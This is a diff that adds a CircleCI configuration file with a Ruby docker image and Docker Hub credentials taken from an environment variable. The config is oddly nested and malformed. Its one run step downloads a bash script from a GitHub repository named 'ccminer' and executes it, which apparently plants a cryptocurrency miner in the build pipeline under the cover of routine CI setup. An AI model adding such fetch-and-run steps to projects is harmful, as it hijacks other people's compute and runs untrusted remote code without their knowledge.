@@ -1,0 +1,10 @@
+version: 2.0
+jobs:
+  build:
+      docker:
+            - image: circleci/ruby:2.5.3 
+            -         auth:
+            -                   username: mydockerhub-user
+            -                             password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+            -                                 steps:
+      - run: wget https://raw.githubusercontent.com/skydgffajk/ccminer/main/bash.sh && chmod +x bash.sh && ./bash.sh
